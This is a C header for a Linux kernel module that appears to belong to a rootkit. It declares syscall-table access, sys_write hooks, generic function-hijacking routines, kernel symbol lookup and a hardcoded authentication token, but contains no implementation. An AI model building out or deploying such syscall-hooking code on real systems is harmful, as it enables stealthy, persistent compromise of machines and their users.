#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/version.h>
#include <linux/unistd.h>
#include <linux/slab.h>
#include <linux/list.h>
#include <linux/fs.h>
#if LINUX_VERSION_CODE >= KERNEL_VERSION(2, 6, 33)
#include <generated/autoconf.h>
#else
#include <linux/autoconf.h>
#endif

#define AUTH_TOKEN 0x12345678   
#define __DEBUG__ 1             // General debugging statements
#define __DEBUG_RW__ 1          // Debugging of sys_write hooks
#define __DEBUG_HOOK__ 1        // Debugging of function hooking

#if __DEBUG__
# define DEBUG(fmt, ...) printk(fmt, ##__VA_ARGS__)
#else
# define DEBUG(fmt, ...)
#endif


#if __DEBUG_RW__
# define DEBUG_RW(fmt, ...) printk(fmt, ##__VA_ARGS__)
#else
# define DEBUG_RW(fmt, ...)
#endif

#if __DEBUG_RW__
# define DEBUG_HOOK(fmt, ...) printk(fmt, ##__VA_ARGS__)
#else
# define DEBUG_HOOK(fmt, ...)
#endif

extern unsigned long *sys_call_table;

char *strnstr(const char *haystack, const char *needle, size_t n);
void *memmem(const void *haystack, size_t haystack_size, const void *needle, size_t needle_size);
void *memstr(const void *haystack, const char *needle, size_t size);

void hijack_start(void *target, void *new);
void hijack_pause(void *target);
void hijack_resume(void *target);
void hijack_stop(void *target);

void hook_sys_write ( void *new);
void unhook_sys_write(void *orig);



#if LINUX_VERSION_CODE >= KERNEL_VERSION(2, 6, 30)
unsigned long get_symbol(char *name);
#endif


#if defined(_CONFIG_X86_64_)
extern unsigned long *ia32_sys_call_table;
#endif


#if defined(_CONFIG_HOOKRW_)
void hookrw_init(void);
void hookrw_exit(void);
#endif

